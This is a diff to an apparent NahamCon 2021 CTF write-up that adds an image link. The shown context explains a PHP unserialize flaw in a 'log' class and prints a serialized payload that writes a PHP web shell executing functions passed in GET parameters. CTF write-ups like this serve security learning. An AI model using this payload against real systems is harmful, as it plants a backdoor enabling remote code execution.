@@ -201,6 +201,8 @@ class log
 
 by reading the code we understand that our input is unserialized by the application, and we just control the log filename`($logs)` we want and the content`($request)` by using this serialize payload below:
 
+![../images/nahamcon21/php-doctor.png](../images/nahamcon21/php-doctor.png)
+
 ```
 O:3:"log":4:{s:4:"logs";s:16:"yerabajigur5.php";s:7:"request";s:28:"<?php $_GET[1]($_GET[2]); ?>";s:6:"cereal";s:5:"XXXXX";s:4:"milk";s:2:"AA"}
 ```
